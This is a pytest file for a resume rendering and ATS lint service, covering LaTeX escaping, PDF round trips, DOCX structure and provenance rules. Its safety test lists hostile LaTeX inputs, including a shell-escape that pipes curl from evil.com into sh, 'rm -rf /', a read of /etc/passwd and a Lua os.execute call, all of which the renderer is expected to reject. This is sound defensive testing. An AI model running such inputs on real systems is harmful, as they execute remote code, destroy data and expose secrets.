"""Tests for the render + lint loop.

The important test here is test_ats_roundtrip_recovers_contact: it renders a
resume containing every character that historically breaks LaTeX resume
pipelines, then re-extracts the PDF and asserts the data survived. That single
test is what lets us make an ATS claim honestly.
"""

from __future__ import annotations

import pytest

from app.atslint.engine import extract, lint, reading_order_ok
from app.models import Resume, TemplateOptions
from app.render.docx import render_docx
from app.render.latex_env import fmt_month, fmt_range, latex_escape
from app.render.pdf import UnsafeSourceError, assert_safe_tex, render_pdf, render_tex

# A resume built specifically out of the things that break LaTeX pipelines:
# ampersands, percent signs, C#, underscores, curly quotes, em dashes, rupee
# signs, and a 100% claim.
HOSTILE = {
    "schemaVersion": "1.0",
    "meta": {"locale": "en-IN", "situation": "standard", "seniority": "mid"},
    "basics": {
        "name": "Priya Raghunathan",
        "headline": "Backend Engineer — Payments & Ledger",
        "email": "priya.r+jobs@example.co.in",
        "phone": "+91 98765 43210",
        "location": "Kolkata, West Bengal",
        "links": [
            {"label": "GitHub", "url": "https://github.com/priya_r"},
            {"label": "LinkedIn", "url": "https://linkedin.com/in/priya-r"},
        ],
        "legacy": {
            "fatherName": "R. Raghunathan",
            "dob": "1996-04-12",
            "maritalStatus": "Single",
        },
    },
    "summary": {
        "text": "Backend engineer with 5 years on payments systems. Cut settlement "
                "failures by 40% and owns a ledger handling ₹200Cr/month.",
        "origin": "user",
    },
    "sections": [
        {
            "id": "s-exp",
            "kind": "experience",
            "heading": "Work Experience",
            "items": [
                {
                    "id": "exp-1",
                    "role": "Senior Engineer — Payments",
                    "org": "Ernst & Young Technology",
                    "location": "Bengaluru",
                    "dates": {"start": "2022-03", "end": "present"},
                    "bullets": [
                        {"id": "exp-1-b1", "origin": "user",
                         "text": "Rebuilt settlement reconciliation, cutting failures 40% "
                                 "and saving ~₹1.2Cr/year in manual write-offs."},
                        {"id": "exp-1-b2", "origin": "user",
                         "text": "Owned the double-entry ledger service (C#/.NET), 99.98% uptime."},
                        {"id": "exp-1-b3", "origin": "ai-rewritten", "sourceId": "exp-1-b2",
                         "text": "Led migration of user_accounts & tax_records tables with "
                                 "100% data integrity — zero downtime."},
                    ],
                },
                {
                    "id": "exp-2",
                    "role": "Engineer",
                    "org": "Zeta {Fintech}",
                    "dates": {"start": "2020-07", "end": "2022-02"},
                    "bullets": [
                        {"id": "exp-2-b1", "origin": "user",
                         "text": "Built REST APIs handling 2M requests/day at <100ms p99."},
                    ],
                },
            ],
        },
        {
            "id": "s-edu",
            "kind": "education",
            "heading": "Education",
            "items": [
                {
                    "id": "edu-1",
                    "degree": "B.Tech",
                    "field": "Computer Science & Engineering",
                    "institution": "Jadavpur University",
                    "location": "Kolkata",
                    "dates": {"start": "2016", "end": "2020"},
                    "score": "8.7 CGPA",
                    "details": [],
                }
            ],
        },
        {
            "id": "s-skills",
            "kind": "skills",
            "heading": "Skills",
            "groups": [
                {"label": "Languages", "items": ["C#", "Python", "Go", "SQL"]},
                {"label": "Infrastructure", "items": ["Docker", "Kubernetes", "PostgreSQL", "Kafka"]},
            ],
        },
        {
            "id": "s-proj",
            "kind": "projects",
            "heading": "Projects",
            "items": [
                {
                    "id": "prj-1",
                    "title": "ledger-lite",
                    "subtitle": "Open-source double-entry ledger",
                    "url": "https://github.com/priya_r/ledger-lite",
                    "bullets": [
                        {"id": "prj-1-b1", "origin": "user",
                         "text": "400+ stars; used by 3 payment startups."},
                    ],
                }
            ],
        },
    ],
}


@pytest.fixture
def resume() -> Resume:
    return Resume.model_validate(HOSTILE)


# --- escaping ---------------------------------------------------------------

@pytest.mark.parametrize(
    "raw,expected_fragment",
    [
        ("Ernst & Young", r"\&"),
        ("100% integrity", r"\%"),
        ("C#", r"\#"),
        ("user_accounts", r"\_"),
        ("Zeta {Fintech}", r"\{"),
        ("cost $500", r"\$"),
        ("a~b", r"\textasciitilde"),
        ("x^2", r"\textasciicircum"),
        ("back\\slash", r"\textbackslash"),
    ],
)
def test_latex_escape_handles_specials(raw: str, expected_fragment: str) -> None:
    assert expected_fragment in latex_escape(raw)


def test_latex_escape_normalises_smart_punctuation() -> None:
    out = latex_escape("\u201cquoted\u201d \u2014 it\u2019s fine\u2026")
    assert "\u201c" not in out and "\u2019" not in out and "\u2026" not in out


def test_latex_escape_strips_zero_width() -> None:
    assert latex_escape("Py\u200bthon") == "Python"


def test_ligatures_normalised_so_extraction_survives() -> None:
    # ﬁ as a single codepoint extracts as garbage from many PDFs.
    assert latex_escape("\ufb01nance") == "finance"


# --- dates ------------------------------------------------------------------

def test_date_formatting_is_single_consistent_format() -> None:
    assert fmt_month("2024-03") == "Mar 2024"
    assert fmt_month("2024") == "2024"
    assert fmt_month("present") == "Present"
    assert fmt_range({"start": "2022-03", "end": "present"}) == "Mar 2022 -- Present"


# --- safety -----------------------------------------------------------------

@pytest.mark.parametrize(
    "hostile",
    [
        r"\write18{curl evil.com | sh}",
        r"\immediate\write18{rm -rf /}",
        r"\input{/etc/passwd}",
        r"\openout\myfile=/tmp/x",
        r"\usepackage{shellesc}",
        r"\input{../../secrets}",
        r"\directlua{os.execute('id')}",
    ],
)
def test_dangerous_latex_is_rejected(hostile: str) -> None:
    with pytest.raises(UnsafeSourceError):
        assert_safe_tex(r"\documentclass{article}\begin{document}" + hostile + r"\end{document}")


def test_ordinary_latex_passes() -> None:
    assert_safe_tex(r"\documentclass{article}\begin{document}Hello \& goodbye\end{document}")


# --- tex generation ---------------------------------------------------------

def test_tex_renders_and_escapes_everything(resume: Resume) -> None:
    tex, spec = render_tex(resume, "ats-classic-single", None, TemplateOptions())
    assert spec.id == "ats-classic-single"
    assert r"\documentclass" in tex
    assert r"Ernst \& Young" in tex
    assert r"user\_accounts" in tex
    assert "100\\%" in tex
    # Jinja delimiters must be fully consumed
    assert r"\VAR{" not in tex
    assert r"\BLOCK{" not in tex


def test_legacy_biodata_never_reaches_the_document(resume: Resume) -> None:
    """Photo, DOB, parentage and marital status are captured on the record but
    must not render — parsers can't use them and many employers must discard
    applications containing them."""
    tex, _ = render_tex(resume, "ats-classic-single", None, TemplateOptions())
    assert "Raghunathan" in tex          # the person's own surname is fine
    assert "R. Raghunathan" not in tex   # father's name is not
    assert "1996-04-12" not in tex
    assert "Single" not in tex


def test_template_options_change_output(resume: Resume) -> None:
    a, _ = render_tex(resume, "ats-classic-single", None,
                      TemplateOptions(density="compact"))
    b, _ = render_tex(resume, "ats-classic-single", None,
                      TemplateOptions(density="airy"))
    assert a != b


def test_version_pinning_refuses_a_silent_upgrade(resume: Resume) -> None:
    """A resume pinned to a version we no longer ship must fail loudly rather
    than render differently from what the user approved."""
    with pytest.raises(FileNotFoundError):
        render_tex(resume, "ats-classic-single", "0.0.1-nonexistent", TemplateOptions())


# --- the round trip ---------------------------------------------------------

@pytest.mark.skipif(
    __import__("shutil").which("tectonic") is None,
    reason="tectonic not installed; run inside the docsvc container",
)
def test_ats_roundtrip_recovers_contact_and_employment(resume: Resume) -> None:
    """The load-bearing test. Render, then re-extract with a different library,
    and assert the information survived. If this fails, our ATS claim is false."""
    pdf, _tex, _log, _ms = render_pdf(resume, "ats-classic-single", None, TemplateOptions())
    report = lint(resume, pdf)

    assert report.grade in ("A", "B"), f"grade {report.grade}: {report.findings}"
    assert report.field_recovery > 0.9, f"recovery {report.field_recovery}"
    assert report.reading_order_ok

    ex = extract(pdf)
    assert "priya.r+jobs@example.co.in" in ex.text
    assert "98765" in ex.text.replace(" ", "")
    assert "Ernst" in ex.text
    assert "Jadavpur" in ex.text
    # C# is the classic casualty of naive escaping
    assert "C#" in ex.text

    errors = [f for f in report.findings if f.severity == "error"]
    assert not errors, f"unexpected errors: {errors}"


@pytest.mark.skipif(
    __import__("shutil").which("tectonic") is None,
    reason="tectonic not installed",
)
def test_single_column_template_has_clean_reading_order(resume: Resume) -> None:
    pdf, *_ = render_pdf(resume, "ats-classic-single", None, TemplateOptions())
    assert reading_order_ok(extract(pdf))


# --- docx -------------------------------------------------------------------

def test_docx_renders_without_tables_or_textboxes(resume: Resume) -> None:
    """Layout tables and text boxes are the two structures ATS parsers handle
    worst, which is exactly why we don't derive DOCX from LaTeX."""
    import io

    from docx import Document

    data = render_docx(resume, {"accentColor": "#111111", "sectionRule": True})
    doc = Document(io.BytesIO(data))

    assert len(doc.tables) == 0, "no layout tables permitted"

    xml = doc.element.xml
    assert "w:txbxContent" not in xml, "no text boxes permitted"

    text = "\n".join(p.text for p in doc.paragraphs)
    assert "Priya Raghunathan" in text
    assert "priya.r+jobs@example.co.in" in text
    assert "Ernst & Young Technology" in text
    assert "C#" in text
    # Contact info must be in the body, not a header — parsers skip headers.
    assert "R. Raghunathan" not in text


def test_docx_uses_real_heading_styles(resume: Resume) -> None:
    import io

    from docx import Document

    doc = Document(io.BytesIO(render_docx(resume, {})))
    styles_used = {p.style.name for p in doc.paragraphs}
    assert "Heading 2" in styles_used, "section detection depends on real styles"
    assert "List Bullet" in styles_used, "bullets must be real lists, not glyphs"


# --- provenance -------------------------------------------------------------

def test_ai_rewritten_bullet_without_source_is_rejected() -> None:
    """The schema itself enforces the no-fabrication rule."""
    bad = {
        "schemaVersion": "1.0",
        "basics": {"name": "Test"},
        "sections": [
            {
                "id": "s1", "kind": "experience", "heading": "Work Experience",
                "items": [{
                    "id": "e1", "role": "Dev", "org": "Co",
                    "dates": {"start": "2020"},
                    "bullets": [{"id": "b1", "text": "Invented from nothing",
                                 "origin": "ai-rewritten"}],
                }],
            }
        ],
    }
    with pytest.raises(ValueError, match="sourceId"):
        Resume.model_validate(bad)
